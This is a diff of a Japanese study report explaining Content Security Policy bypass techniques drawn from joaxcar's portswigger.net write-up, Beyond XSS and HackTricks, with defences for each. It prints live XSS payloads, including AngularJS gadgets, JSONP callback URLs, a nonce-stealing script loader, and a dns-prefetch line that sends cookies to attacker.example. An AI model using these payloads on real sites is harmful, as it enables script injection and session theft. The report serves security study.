+CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action`, `connect-src` などの**ディレクティブ**ごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトを実行しようとするたびに、その取得元URLやインラインかどうかを対応ディレクティブの**ソースリスト**と照合し、一致しなければブロックする。
 
-> ⚠️ **未取得の資料**: 「CSP bypass on PortSwigger.net using Google script resources」（joaxcar, 2024-02-19）は自動取得できませんでした（理由: 環境のegressプロキシにより `joaxcar.com` へのアクセスがブロックされたため。GitHub上のミラーも存在せず、代替としてWeb検索を実施し、HackerOne上の開示情報および関連ブログの要約から概要を再構成した）。詳細は必ず以下のURLからユーザーご自身でご覧ください: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
+ソースリストで使われる主なキーワードの意味は次の通り。バイパスはこの一つ一つの「解釈の隙間」を突くので、正確に押さえておく。
 
-（以下は未取得資料の補足として、検索で得られた公開情報＋一般知識に基づく解説です）
+| キーワード | 意味 | 注意点（＝攻撃の入口になりやすい理由） |
+|---|---|---|
+| `'self'` | 同一オリジンのリソースのみ許可 | サイト内にファイルアップロードやJSONPがあると自爆する |
+| `'unsafe-inline'` | インライン `<script>`・イベントハンドラを許可 | これがあると事実上XSS防御は無い |
+| `'unsafe-eval'` | `eval()` / `Function()` 等を許可 | ライブラリのテンプレート評価が着火点になる |
+| `'nonce-xxxx'` | 指定した乱数トークンを持つインラインスクリプトのみ許可 | `strict-dynamic` が無いとホワイトリスト頼みに戻る |
+| `'strict-dynamic'` | nonce/hashで信頼されたスクリプトが動的に読み込む子スクリプトも信頼する。**ホスト名ホワイトリストを無効化する** | 正しく使えば強力だが、旧ブラウザ用フォールバックが緩いと台無し |
+| `'unsafe-hashes'` | 特定のインラインイベントハンドラをハッシュで許可 | ガジェット経由の悪用余地 |
+| `data:` | `data:` URIからの読み込みを許可 | `data:text/javascript,...` を直接注入できる |
+| `blob:` | `blob:` URLを許可 | JSで生成したBlobを実行できる |
+| `*` | data:/blob:/filesystem: 以外の全URLを許可 | 実質ホワイトリスト無効化 |
 
-**概要（2024年2月19日公開、報告者 Johan Carlsson / joaxcar、HackerOne経由でPortSwiggerに報告、報奨金1,500ドル）**
-
-PortSwigger.net が配信していたCSPの `script-src` ディレクティブには、Google Tag Manager や Google Analytics 等を動かすために `https://www.google.com` や `https://www.googletagmanager.com` のような「Googleが管理する巨大な共有ドメイン」が許可元として含まれていた。ここでの根本原因は次の**プリンシパルの誤り**である。
-
-- CSPの `script-src https://www.google.com` という記述は、「そのオリジンから配信されるあらゆるスクリプトファイル」を無条件に信頼することを意味する。
-- しかし `www.google.com` のような巨大ドメインは、検索・ウィジェット・実験的機能など無数のサブパスでJavaScriptを配信しており、その中には**任意のコードを実行できる「スクリプトガジェット」**（本来は無害な目的で書かれているが、外部から渡せるパラメータや埋め込みHTML経由で任意のJS実行に転用できるライブラリ・コード片）が紛れ込んでいる。
-- 具体的にはAngularJSのような、DOM上の属性（`ng-app`、`ng-csp` など）をテンプレートとして評価するフレームワークがGoogleドメインの許可対象パス上でホストされているケースがあり、攻撃者はXSSで注入したHTML（`<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` のようなAngular式）と、CSPで許可済みのGoogleドメインから読み込んだAngularJS本体を組み合わせることで、CSPが `script-src` を制限していても最終的に任意JavaScriptを実行できてしまう。
-
-```html
-<!-- CSPが https://www.google.com/... 配下のAngularJSを許可している場合の典型例 -->
-<script src="https://www.google.com/.../angular.js"></script>
-<div ng-app ng-csp>
-  {{constructor.constructor('alert(document.domain)')()}}
-</div>
-```
-これが動く理由は、**CSPはスクリプトの「取得元（どこから来たか）」しか検証せず、「そのスクリプトが実行時にどんなAPI・機能を提供するか」は一切見ていない**からである。AngularJSはCSP的には「許可されたドメインから来た正規のスクリプト」でしかないが、実行時にはDOM上のテンプレート構文を評価してJavaScriptとして実行するインタプリタとして振る舞う。攻撃者はこの「許可されたインタプリタ」に自分の注入したマークアップを食わせることで、事実上のコード実行を得る。
-
-PortSwigger側のCSPには他にも懸念があり、修正後もjoaxcarは追加で「フォームハイジャック（form hijacking）」によるCSP回避を報告している。これは `form-action` ディレクティブが十分に制限されていない場合、攻撃者がXSSで `<form action="https://attacker.example">` を注入し、既存の入力フィールド（ログインフォームなど）の送信先を書き換えることで、CSPの `script-src` を一切破らずに認証情報や機密情報を外部に持ち出す手法である（詳細はPortSwigger Researchの "Using form hijacking to bypass CSP" 参照）。
-
-**教訓（原理レベル）**: CSPのホワイトリストは「ドメインの信頼」を「そのドメイン上の全パスの安全性」に暗黙に拡大してしまう。巨大なCDNやアナリティクスドメイン（Google, Cloudflare, jsDelivr等）を安易に許可すると、そのドメイン上でホストされている無数のライブラリの中から「スクリプトガジェット」を探し出されるだけでバイパスされる。対策は、許可ドメインを最小化し、可能な限り `strict-dynamic` + nonce/hash方式（後述）へ移行することである。
+**CSPバイパスとは、この照合ロジックの「抜け（設定漏れ）」や「解釈のズレ（パーサ差異・リダイレクト）」を突いて、ポリシーが本来許可しないはずの挙動を実行させる技術群**である。重要な洞察は、バイパスの多くが「攻撃コードの巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクト）が存在する」という運用上の見落としを突くという点にある。
 
 ---
 
-### 2. Beyond XSS: 一般的なCSPバイパス手法
+### 資料1：joaxcar — Googleスクリプトリソースによる portswigger.net のCSPバイパス（2024年）
 
-> ⚠️ **未取得の資料（部分的）**: 「Bypassing Your Defenses: Common CSP Bypasses」（Beyond XSS, aszx87410, Chapter 2）は自動取得できませんでした（理由: `aszx87410.github.io` が環境のegressプロキシでブロックされ、GitHubリポジトリ `aszx87410/beyond-xss` 内の該当Markdownファイルも直接のパス推測では404となり取得できなかったため。Web検索による断片的な要約のみ確認できている）。正確な全文は以下のURLからユーザーご自身でご覧ください: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
+Johan Carlsson（joaxcar）は2024年2月、CSPで守られた **portswigger.net 本体**（PortSwigger社の公式サイト）で、nonceベースのCSPを完全にバイパスして任意スクリプト実行に至った事例を報告した。これは「nonceがあってもホワイトリスト依存だと破れる」という s4i/s4l の理論を、標的が防御側のプロ企業自身であるという象徴的な形で実証したケースである。
 
-（以下は検索で得られた要約情報＋一般知識に基づく体系的な補足解説です）
+#### 弱点の構図：nonce + ホワイトリスト、ただし `strict-dynamic` なし
 
-Beyond XSSのCSPバイパス章は、CSPを「XSSに対する第二の防衛線」と位置づけた上で、代表的なバイパスパターンを類型化して紹介している。確認できた要点と、それを補う一般的な技術解説は以下の通り。
+portswigger.net のCSPは、インラインスクリプトを `nonce` で制御しつつ、reCAPTCHA のために Google のスクリプトリソース（`https://www.google.com/recaptcha` と `https://www.gstatic.com/recaptcha`）をホスト名で**ホワイトリスト**していた。ここに `'strict-dynamic'` が付いていなかったことが致命的だった。`strict-dynamic` が無いnonce CSPでは、**ホワイトリストされたホストのURLはnonceが無くても読み込めてしまう**。つまりnonceで固めたつもりでも、実質は「Googleのリソースなら何でも許可」の状態に戻っていた。
 
-**(a) オープンリダイレクト + JSONPの組み合わせ**
+そしてGoogleが reCAPTCHA と一緒に配信していたバンドルの中には、**AngularJS が含まれていた**。AngularJSは「CSPの定番ブレーカー（classic CSP breaker）」と呼ばれ、ページに読み込ませるだけで、Angularのテンプレート式評価を通じてサンドボックス外のJSを実行できてしまうことで知られる。
 
-CSPの `script-src` に許可されたドメイン（例: `accounts.google.com`）に**オープンリダイレクト**（任意の外部URLへ転送してしまう脆弱な機能、例: `/logout?continue=<任意URL>`）が存在する場合、攻撃者は次のようなURLを `<script src="...">` に指定できる。
+#### ステップ1：Angularガジェットで最初のJS実行を得る
 
-```html
-<script src="https://accounts.google.com/logout?continue=https://attacker.example/evil.js"></script>
-```
-
-これが動く理由は、**CSPのソース照合はリクエスト送信前のURL（＝スクリプトタグに書かれたURL）のホスト名だけを見て許可判定を行い、その後サーバ側やHTTP 30x応答で発生するリダイレクト先までは検証しないブラウザの実装が存在する**ためである（仕様上はCSP3でリダイレクト後のURLも再検証すべきとされているが、実装や設定によっては初期リクエストのホストだけで通過してしまうケースが報告されてきた）。結果として、許可ドメインのオープンリダイレクトを踏み台に、任意ドメインからのスクリプト読み込みへとすり替えられる。
-
-さらにこれをJSONPエンドポイント（`?callback=xxx` のようなパラメータでJavaScriptの関数呼び出し形式のレスポンスを返すAPI）と組み合わせると、リダイレクトすら不要な場合がある。許可済みドメインが `https://trusted.example/api/data?callback=alert(document.cookie)//` のようなJSONPを提供していれば、そのレスポンスは `alert(document.cookie)//({...})` という**そのまま実行可能なJavaScript文**になる。CSPは「trusted.exampleから来たスクリプトである」ことしか検証しないため、中身が攻撃者の指定した任意コードであっても素通りする。
+まず、ホワイトリストされたGoogleドメインからAngularJS入りのスクリプトを読み込み、Angularのディレクティブ（`ng-on-error` などのイベント式）を使って初弾のコード実行を起こす。
 
 ```html
-<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 ```
 
-**(b) `base-uri` 未設定を突いた `<base>` タグインジェクション（Dangling Markup的手法）**
+**なぜ動くか**：`<script src=...>` はホワイトリスト済みホストなのでCSPを通る。読み込まれたバンドルにAngularJSが含まれるため、ページ内のAngularディレクティブ（`ng-on-error`）が有効化される。`<img src=x>` は読み込みに失敗して `error` イベントを発火し、その式 `$event.target.ownerDocument.defaultView.alert(1)` がAngularの式エバリュエータで評価される。式はインラインスクリプトではなく「属性値の中の文字列」なので、`script-src 'nonce-...'` のインライン判定に引っかからない。これがAngularをCSPブレーカーたらしめる核心である。
 
-CSPで `base-uri` ディレクティブが明示されていない場合、攻撃者がHTMLインジェクション（完全なXSSでなくてもタグ挿入ができれば足りる）で以下を注入できる。
+#### ステップ2：nonceを盗み出す
 
-```html
-<base href="https://attacker.example/">
-```
+Angular式の中からは通常のDOM APIが使える。CSPのnonceはDevToolsのAttributes表示では隠されるものの、**JavaScriptからは `element.nonce` プロパティで読み取れる**（DOM上の `[nonce]` セレクタでも要素は選択できる）。
 
-`<base>` は文書内のすべての相対URL（`<script src="app.js">` のような相対パス指定）の基準を書き換える。これにより、ページが本来 `/app.js`（＝自サイト）を読み込むつもりで書いていたコードが、実際には `https://attacker.example/app.js` を読み込んでしまう。これは**HTMLパーサが `<base>` をスクリプト実行前の早い段階（head解析時）で処理し、以降のURL解決に影響を与える**という、DOM構築の順序に起因する挙動である。CSPの `script-src` が正規オリジンを許可していても、その「正規オリジン」の相対パス解決先そのものを攻撃者が乗っ取ってしまう点がポイントで、`base-uri 'self'`（または `'none'`）を明示しない限り防げない。
-
-**(c) Report-Onlyモードの誤運用**
-
-`Content-Security-Policy-Report-Only` ヘッダは、違反を検知してレポートを送信するだけで、**実際のブロックを一切行わない**。開発中の設定確認用ヘッダを本番の `Content-Security-Policy`（強制モード）と混同・併用ミスすると、見た目上は「CSPが設定されている」のに実際には何も制限されておらず、通常のXSSペイロードがそのまま素通りする。これはCSPバイパスというより「CSPが実質的に存在しない」状態だが、監査で見落とされやすい典型的な設定ミスとして紹介されている。
-
-> 出典: Bypassing Your Defenses: Common CSP Bypasses — Beyond XSS — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
-
----
-
-### 3. HackTricks: CSPバイパス総覧
-
-HackTricksの本ページは取得に成功した。CSPの仕組みの整理から実践的なバイパス手法まで非常に広範に扱われており、以下に主要トピックを整理する。
-
-**CSPの基本**
-
-CSPは `script-src`（JS読み込み元）、`default-src`（未指定ディレクティブへのフォールバック）、`connect-src`（`fetch`/`XMLHttpRequest`/WebSocket接続先）、`frame-src`（iframe読み込み元）、`form-action`（フォーム送信先）、`object-src`（`<object>`/`<embed>`/`<applet>`）、`base-uri`（`<base>`要素で指定可能なURL）などのディレクティブで構成される。`Content-Security-Policy-Report-Only` は強制せずレポートのみを行う点は前述の通り。
-
-**脆弱なポリシーごとのバイパス手法**
-
-- **`'unsafe-inline'` が有効な場合**: そもそもインラインスクリプトの実行が許可されているため、通常のHTMLインジェクションから直接 `<script>alert(1)</script>` を注入すればよく、CSPは実質無力化されている。
-- **`'unsafe-eval'` が有効な場合**: `eval()`, `new Function()`, `setTimeout("文字列", …)` などの「文字列をコードとして評価する」API群がブロックされない。`data:` スキームと組み合わせ、`<script src="data:text/javascript;base64,...">` のようにBase64エンコードしたJSをdata URIとして読み込ませる手口も紹介される。これは `unsafe-eval` 自体はdata URI経由の `<script src>` の可否に直接関係しないディレクティブだが、`script-src` の値に `data:` が許可指定として含まれているような構成ミスと合わせて悪用されるケースを指す。
-- **ワイルドカード（`*`）指定**: `script-src *` のように無制限指定、あるいは `https:` のようなスキームだけの指定は、攻撃者が完全に自由なドメインからスクリプトを読み込めることを意味し、CSPとして機能していない。
-- **`strict-dynamic` の誤解**: `strict-dynamic` は「nonceまたはhashで許可された信頼済みスクリプトが、動的に（`document.createElement('script')`等で）生成した新しいスクリプトタグは、そのURLに関わらず自動的に信頼する」という委譲の仕組みである。これは元々「ドメインホワイトリスト方式の弱点（前述のjoaxcarの例のようなガジェット問題）を解消するため」に導入された仕様だが、逆に**信頼済みスクリプト自身にXSS類似の脆弱性（例えばそのスクリプトが外部入力をもとに新しいscriptタグを組み立ててしまうコード）があれば、その信頼を丸ごと悪用される**という新たなリスクを生む。
-- **ファイルアップロード + `'self'`**: アップロードされたファイルが自サイト（`'self'`）配下に置かれ、かつサーバがMIMEタイプやURLパスの拡張子判定を誤る場合、`picture.png.js` のような二重拡張子ファイルをアップロードし、`<script src="/uploads/picture.png.js">` として読み込ませることで、`'self'` 制限下でもJS実行に成功する。
-- **サードパーティエンドポイント悪用**: 前述のAngularJS + `ng-app`/`ng-csp` の式評価パターンに加え、Google reCAPTCHAのスクリプト（`recaptcha/about/js/main.min.js`）が提供するAngular的な `ng-on-error` ディレクティブを介した `alert()` 実行例や、Google検索サジェストのJSONPエンドポイント（`google.com/complete/search?...&callback=alert#1`）を `<script src>` に指定してコード実行させる例が挙げられている。いずれも「許可ドメイン上に存在する、開発者が意図しない機能拡張点（テンプレートエンジンやコールバックパラメータ）」を突く点で共通している。
-- **Relative Path Overwrite (RPO)**: `<script src="https://example.com/scripts/react/..%2fangular%2fangular.js">` のように、URLエンコードしたパストラバーサル（`%2f` は `/` のURLエンコード表現）をスクリプトのパスに混ぜる。CSPの照合はオリジン単位で行われ、パスの正規化前後の差異までは厳密にチェックされないブラウザ実装があるため、`../` に相当する記述で許可オリジン配下の別のスクリプト（本来読み込むはずのなかった脆弱なライブラリ）にすり替えられる。
-- **`base-uri` 欠如の悪用**: Beyond XSSの節で述べた `<base href="https://attacker.example/">` インジェクションと同様の手法。
-- **nonce再利用/漏洩**: 同一ページ内の別の場所（例えば別のiframe経由でDOMアクセスできる箇所）に置かれた正規の `nonce` 属性値を読み取り、それを攻撃者が新しく生成する `<script>` タグの `nonce` にコピーして貼り付けることで、CSPのnonce検証（「このリクエストに使われたnonceが、レスポンスヘッダで指定されたnonceと一致するか」）をすり抜ける。これはnonceの値そのものは正しいので検証上は「合法」なスクリプトとして扱われてしまうことに起因する。
-- **許可元でのリダイレクト**: CSPでパスまで絞った許可（例: `script-src https://www.google.com/a/b/c/d`）をしていても、そのURLが302リダイレクトで別のパス・別のリソースへ転送する場合、多くのブラウザ実装は「最初にマッチしたオリジンさえ許可条件を満たせばよい」とみなし、リダイレクト先のパスまでは再検証しない（前述のBeyond XSSのオープンリダイレクト事例と同根の問題）。
-- **Service Worker経由の `importScripts` 悪用**: Service Worker内で使われる `importScripts()` はCSPの `script-src` 制限の対象外として扱われる実装上のギャップが存在し、Service Workerを登録できる状況（`self` オリジンへの書き込み権限がある等）ではCSPをすり抜けてコードを読み込める。
-- **ポリシー注入によるCSP破壊**: HTTPヘッダインジェクションなどでCSPヘッダ自体に追記できる状況では、ブラウザ実装依存の挙動を突いて既存ポリシーを無力化できる。例としてChromeでは `script-src-elem *; script-src-attr *` のような、より詳細度の高い（fetch directiveの中でも要素・属性別に分かれた）ディレクティブを追加注入すると、それが `script-src` の指定を実質的に上書き・無効化してしまう仕様上の優先順位（`script-src-elem`/`script-src-attr` は `script-src` よりも詳細度が高く優先される）が悪用される。Edgeでは `;_` のような無効なトークンを挿入すると、パーサの誤動作でポリシー全体が破棄されるという実装バグ的な事例も紹介されている。
-
-**CSPが有効なままでの情報窃取（バイパスせずに漏洩させる手法）**
-
-XSSは成立したがCSPで外部への `fetch`/`script`/`img` 読み込みが厳密にブロックされている場合でも、CSPのディレクティブがカバーしていない経路を使えば情報を持ち出せる。
-
-- **DNSプリフェッチ悪用**: `<link rel="dns-prefetch" href="//<盗みたいデータ>.attacker.example">` を注入すると、ブラウザは表示パフォーマンス向上のためにこのホスト名を事前にDNS解決しようとする。DNSクエリの送信自体はCSPの `connect-src`/`img-src` 等のフェッチ系ディレクティブの制御対象外であることが多く、機密情報（セッションIDの断片など）をサブドメインに埋め込んでDNSクエリとして外部（攻撃者が権威DNSサーバを持つドメイン）に送信できる。
 ```javascript
-var sessionid = document.cookie.split("=")[1] + "."
-document.body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.example">'
+const nonce = document.querySelector("[nonce]").nonce;
 ```
-これが機能する理由は、**CSPのフェッチ系ディレクティブはHTTP/HTTPSやWebSocketなど「アプリケーション層のリクエスト」を制御対象として設計されており、ブラウザが内部的に行うDNS解決という「名前解決レイヤーの動作」までは制御範囲に含まれていない**ためである。
-- **WebRTCのSTUN/ICE経由の漏洩**: `RTCPeerConnection` でSTUNサーバへの接続を試みる際に発生する通信も、CSPの `connect-src` の対象外となる実装・バージョンが存在し、STUNサーバのホスト名部分にデータを埋め込んで外部に送信する手口が使われてきた（ブラウザベンダ側でも `connect-src` へのWebRTC組み込みが順次進められているため、対象ブラウザ・バージョンによって有効性が異なる点に注意）。
-- **`document.location` による直接遷移**: CSPは「リソースの読み込み」を制御するものであり、`navigate-to` ディレクティブ（実装が限定的）を設定していない限り、`document.location = "https://attacker.example/?" + secret` のようなページ遷移そのものはブロックされないブラウザが多い。これはCSPの設計思想が「埋め込みリソースの出所検証」であって「ユーザーの能動的なナビゲーション」とは別物として扱われてきた歴史的経緯による。
 
-**PHPの実装上の欠陥を突いたCSPヘッダそのものの無効化**
+**なぜ動くか**：ブラウザはnonce値をHTML属性としては露出しない（属性ゲッターでは空になる）が、IDLプロパティ `HTMLScriptElement.nonce` としてはスクリプトから参照可能なまま残す。この「属性は隠すがプロパティは残す」という設計上の非対称が、同一オリジンで既に走っているスクリプト（ここではAngular経由の攻撃者コード）にとっては抜け穴になる。
 
-サーバサイドの実装（特にPHP）に起因する、CSPヘッダ自体を消し飛ばす手法も紹介されている。
+#### ステップ3：盗んだnonceで任意スクリプトを注入して昇格
 
-- 1001個以上のGETパラメータを送信すると、PHPが警告（notice/warning）を出力し、それがレスポンスボディに先行して出力されてしまう場合、`header()` 関数（レスポンスヘッダを設定するPHP関数）呼び出し前に本文が出力されたことになり「headers already sent」エラーとなってヘッダ設定自体が失敗する。
-- `max_input_vars`（PHPのデフォルトは1000）を超える数の入力変数を送ると同様の警告が発生し、CSPヘッダの送信に失敗する。
+nonceさえ手に入れば、正規のインラインスクリプトになりすまして外部スクリプトを注入できる。`unsafe-eval` が無くても関係ない。
+
+```html
+<img src=x ng-on-error='doc=$event.target.ownerDocument;
+a=doc.defaultView.top.document.querySelector("[nonce]");
+b=doc.createElement("script");
+b.src="//example.com/evil.js";
+b.nonce=a.nonce; doc.body.appendChild(b)'>
 ```
-curl "http://example.com/?xss=<svg/onload=alert(1)>&A=1&A=2&...(1000個以上)"
-```
-- レスポンスバッファ（PHPのデフォルトのoutput_buffering相当、目安として4096バイト程度）を大量の警告メッセージで埋め尽くすと、CSPヘッダがレスポンスバッファからあふれて実際に送出されるレスポンスに含まれなくなる。
 
-これらはいずれも「アプリケーションのエラーハンドリングの不備によって、セキュリティヘッダの送信自体が失われる」という、CSPロジック外の攻撃面である点に注意したい。
+**なぜ動くか**：新しく作った `<script>` 要素に正規の `nonce` を設定して `body` に追加すると、ブラウザはそのスクリプトを「nonce一致＝許可済み」と判定して実行する。これでホワイトリスト外の任意オリジン（`//example.com/evil.js`）から任意コードを実行でき、部分的なXSSが完全なXSSへ昇格する。
 
-**検証・防御のためのツールとベストプラクティス**
+#### 影響・報奨・修正
 
-- チェックツール: Google製の `CSP Evaluator`（csp-evaluator.withgoogle.com）、`cspvalidator.org`、ポリシー自動生成の `csper.io` などが実務でよく使われる。
-- 防御の骨子は次の通りである。
-  1. `'unsafe-inline'` と `'unsafe-eval'` を避ける。
-  2. ドメインホワイトリスト方式ではなく、`nonce`（レスポンスごとに生成するワンタイムのランダムトークン）または `hash`（許可するインラインスクリプトのSHA値）と `'strict-dynamic'` を組み合わせる方式に移行する。これによりjoaxcarの事例のような「許可ドメイン上のガジェット探索」を無効化できる。
-  3. `object-src 'none'` で古いプラグイン（Flash等）ベクタを遮断する。
-  4. `base-uri 'self'`（または `'none'`）を必ず明示し、`<base>` インジェクションを封じる。
-  5. `form-action 'self'` を設定し、フォームハイジャックを防ぐ。
-  6. サードパーティドメインを許可リストに入れる際は、そのドメイン上に存在する全パスの安全性まで保証できないことを前提に、可能な限り許可対象を細く・具体的なパスまで絞り込む（ただし前述のリダイレクト・RPOのようにパス指定も万能ではない点に留意）。
-  7. アップロードファイルのMIMEタイプ・拡張子検証を厳格化し、`'self'` 配下にユーザ制御コンテンツを置く場合は別オリジン（サブドメイン分離等）に退避する。
+完全なCSPバイパスにより、限定的なHTMLインジェクションから任意コード実行へ到達した。PortSwiggerはこのCSPバイパスを受理（$1,000）、さらに欠けていた `form-action` ディレクティブも指摘され（$500）、両方を修正した。教訓は明快で、**nonceベースCSPには `'strict-dynamic'` を必ず併用し、ホスト名ホワイトリスト（とりわけAngularJSやJSONPを配りうるGoogle系ドメイン）に依存しない**こと。
 
-> 出典: Content Security Policy (CSP) Bypass — HackTricks — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
+> 出典: CSP bypass on portswigger.net using Google script resources — https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
 
 ---
 
-### まとめ: 3資料を貫く共通原理
+### 資料2：Beyond XSS — CSPバイパスの体系
 
-joaxcar、Beyond XSS、HackTricksの3資料に共通するのは、**CSPバイパスの大半が「CSPのソース照合ロジックが検証しているもの（オリジン・パス・nonce・hash）」と「実際に安全性を左右するもの（そのリソースが実行時に何をするか、リダイレクトやエンコーディングでURLがどう解決されるか）」との間にあるギャップを突いている**という点である。ドメインホワイトリスト方式は運用が直感的である反面、許可ドメイン上の未知のガジェットやオープンリダイレクト・JSONPエンドポイントに脆弱であり、これが `nonce`/`hash` + `strict-dynamic` という現代的な設計への移行が推奨される最大の理由になっている。読者は個々のペイロードを暗記するのではなく、「このCSP設定は何を検証していて、何を検証していないのか」を常に問い直す視点を持つことが、CSPバイパスを体系的に理解する近道である。
+Huli（@aszx87410）の教材 Beyond XSS のCSP章は、「XSSに対する第二の防衛線」としてのCSPを、`script-src` のソース許可評価という視点から系統立てて解体する。実務でよく効く6つのパターンを、原典のペイロードで示す。
+
+#### (1) 許可ドメインが広すぎる（CDNまるごと許可）
+
+`script-src https://unpkg.com/` のようにCDNのオリジンをまるごと許可すると、そのCDN上に置かれた**悪意あるライブラリ**を読み込めてしまう。
+
+```html
+<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
+<br csp="alert(1)">
+```
+
+**なぜ動くか**：`unpkg.com` はnpmの任意パッケージをそのまま配信する。攻撃者が公開した `csp-bypass` パッケージは、独自属性 `csp="..."` の中身をJS式として評価するミニインタプリタ（`sval`）を含む。CSPは「unpkg.com由来のスクリプト」を許可しているだけなので、その中身が攻撃者製でも通る。**防御**は「パスまで完全指定する」こと。`https://unpkg.com/` ではなく `https://unpkg.com/react@16.7.0/` のようにバージョン付きの厳密なパスを書く。
+
+#### (2) `base-uri` 未指定 → `<base>` タグによる相対パス乗っ取り
+
+nonceで守っていても、`base-uri` を指定していないと `<base>` タグで相対URLの基準を攻撃者サーバに向けられる。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="default-src 'none'; script-src 'nonce-abc123';">
+<base href="https://attacker.com/">
+<script nonce=abc123 src="app.js"></script>
+```
+
+**なぜ動くか**：`<script src="app.js">` は相対URLなので、解決の基準が `<base href>` に従う。攻撃者が `<base href="https://attacker.com/">` を注入できれば、`app.js` は `https://attacker.com/app.js` から読み込まれる。nonceは一致しているのでCSPは通ってしまう。**防御**は `base-uri 'none'`（または `'self'`）を必ず入れること。
+
+#### (3) 許可ドメイン上のJSONPエンドポイント
+
+ホワイトリストされたドメインに、コールバック名を検証しないJSONPエンドポイントがあると、そのコールバック引数に任意コードを注入できる。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="script-src https://www.google.com https://www.gstatic.com">
+<script src="https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//"></script>
+```
+
+サーバは次のようなレスポンスを返す。
+
+```javascript
+alert(1);//([{id: 1, name: 'user01'}])
+```
+
+**なぜ動くか**：JSONP（JSON with Padding）は「JSONを指定コールバック関数の引数に包んで返す」仕組み。コールバック名 `jsonp=alert(1)//` がそのままレスポンス冒頭に出力され、末尾の `//` で残りのJSONをコメントアウトするため、`alert(1);` という有効なJSが `www.google.com` オリジンから配信される＝CSP的には完全に正規。**防御**はパスを絞る（`https://www.google.com/recaptcha/` など）とともに、許可ドメインをJSONBeeのようなリストで監査し、既知のJSONP穴が無いか確認すること。
+
+#### (4) コールバックが制限されたJSONP → SOME（Same-Origin Method Execution）
+
+コールバック名が英数字とドットに制限されている場合でも、既存のページ機能を鎖状に呼び出す **SOME攻撃** に持ち込める。
+
+```javascript
+?callback=document.body.firstElementChild.nextElementSibling.click
+```
+
+**なぜ動くか**：任意JSが書けなくても、`a.b.c.method` 形式のメソッド参照は英数字とドットだけで表現できる。JSONPがそれを関数として呼ぶと、ページ上の要素（例：管理操作ボタン）の `click()` などが攻撃者の意図で発火する。WordPressプラグインのインストール攻撃事例として知られる。
+
+#### (5) サーバサイドリダイレクトによるパス制限のすり抜け
+
+CSPの**パス指定はリダイレクト後には再チェックされない**という仕様を突く。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
+<script src="http://localhost:5555/301"></script>
+```
+
+`http://localhost:5555/301` が `https://www.google.com/complete/search?jsonp=alert(1)` へ301リダイレクトすると、CSPは最終URLのパスを検証しないため、JSONP穴のあるパスへ到達できる。**なぜ動くか**：CSPのリダイレクト時のマッチングは「オリジンは見るがパスは見ない」仕様（情報漏洩防止のため、リダイレクト先パスを攻撃者に観測させない設計の副作用）。**防御**はサイトにオープンリダイレクトを残さないこと。
+
+#### (6) 相対パス上書き（RPO）：`%2f` のデコード差
+
+パス制限を、URLエンコードされたスラッシュのデコード差で回避する。
+
+```html
+<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
+```
+
+**なぜ動くか**：ブラウザは `%2f` を「エンコードされた文字」として扱い、パスは表面上 `scripts/react/` 配下に見えるためCSPを通す。ところがサーバ側が `%2f` を `/` にデコードすると、実際には `scripts/react/../angular/angular.js`＝親ディレクトリの `angular/angular.js` が読み込まれる。**防御**はサーバで `%2f` を `/` として正規化しない（デコードしてからのパス解決をしない）こと。
+
+#### (7) 厳格なCSPでも残る情報の持ち出し
+
+`default-src 'none'` でも、以下の経路でデータは外へ出せる（＝CSPはXSSの実行は止めても、情報漏洩の全経路は塞げない）。
+
+- **ナビゲーション**：`window.location = 'https://example.com?q=' + document.cookie`
+- **WebRTC**：ICEサーバ設定を通じてSTUN/TURN経由でデータを漏らす
+- **DNSプリフェッチ**：`<link rel="dns-prefetch" href="https://<秘密>.example.com">` でサブドメインにデータを載せてDNS問い合わせとして送る
+
+将来的な `navigate-to` / `webrtc` ディレクティブが一部を塞ぐ可能性はあるが、現状はCSP単独では防ぎきれない。Beyond XSS は「完全に問題のないCSPを書くのは難しく、時間をかけて段階的にunsafeな要素を消していく」という漸進的ハードニングを推奨している。
+
+> 出典: Beyond XSS — CSP bypass — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
+
+---
+
+### 資料3：HackTricks — CSPバイパス総覧（実務チートシート）
+
+HackTricks のCSPバイパス項は、ペンテスト現場で「与えられたポリシー文字列を見て、どの穴から入るか」を素早く判断するためのカタログである。上の2資料と重なる部分は要点のみとし、追加で重要なものを挙げる。
+
+#### インライン許可・ワイルドカード・スキーム
+
+`'unsafe-inline'` があれば古典的にそのまま通る。
+
+```html
+"/><script>alert(1);</script>
+```
+
+ワイルドカードや広いスキーム（`script-src 'self' https://google.com https: data *;`）があれば、任意オリジンや `data:` から読み込める。
+
+```html
+"/>'><script src=https://attacker-website.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
+```
+
+#### JSONPエンドポイント一覧（許可ドメイン別）
+
+`'self'` に加えてこれらの著名ドメインが許可されていると、既知のJSONP穴でバイパスできる。JSONBee がこうしたエンドポイントをまとめている。
+
+```
+https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1
+https://accounts.google.com/o/oauth2/revoke?callback=eval(...)
+https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert
+https://www.youtube.com/oembed?callback=alert
+```
